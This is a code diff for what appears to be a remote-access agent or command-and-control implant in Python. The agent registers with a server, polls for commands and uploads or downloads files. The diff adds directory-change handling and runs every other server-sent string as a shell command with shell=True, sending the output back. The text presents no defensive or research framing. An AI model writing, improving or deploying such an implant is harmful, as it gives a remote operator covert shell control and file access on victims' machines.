@@ -12,9 +12,9 @@ AGENT_ID = str(uuid.uuid4())
 REGISTER_ENDPOINT = f'{SERVER_URL}/register'
 COMMAND_ENDPOINT = f'{SERVER_URL}/get_command'
 OUTPUT_ENDPOINT = f'{SERVER_URL}/send_output'
-#DOWNLOAD_DIR = 'downloads'  # Directory to save downloaded files
 
-#os.makedirs(DOWNLOAD_DIR, exist_ok=True)
+global current_working_directory
+current_working_directory = os.getcwd()
 
 def resource_path(relative_path):
     """ Get absolute path to resource, works for dev and for PyInstaller """
@@ -29,6 +29,7 @@ def resource_path(relative_path):
 SERVER_CERT = resource_path('server.crt')
 
 def execute_command(command):
+    global current_working_directory
     if command.startswith("download "):
         # This is a command for the agent to upload a file to the server
         filename = command.split(" ", 1)[1]
@@ -37,13 +38,22 @@ def execute_command(command):
         # This is a command for the agent to download a file from the server
         filename = command.split(" ", 1)[1]
         return download_file_from_server(filename)
-    else:
-        # Handle other commands as before
+    elif command.startswith("cd "):
+        directory = command.split(" ", 1)[1]
         try:
-            result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
-            return result.stdout
+            new_dir = os.path.join(current_working_directory, directory)
+            os.chdir(new_dir)
+            current_working_directory = os.getcwd()  # Update the global variable to new directory
+            return f"Changed directory to {current_working_directory}"
+        except Exception as e:
+            return f"Error changing directory: {e}"
+    else:
+        try:
+            # Use the updated current working directory for executing commands
+            result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True, cwd=current_working_directory)
+            return result.stdout or result.stderr or "Executed command successfully."
         except subprocess.CalledProcessError as e:
-            return f"Error executing command: {e}"
+            return f"Error executing command: {e.output}"
         except Exception as e:
             return f"Error: {e}"
 
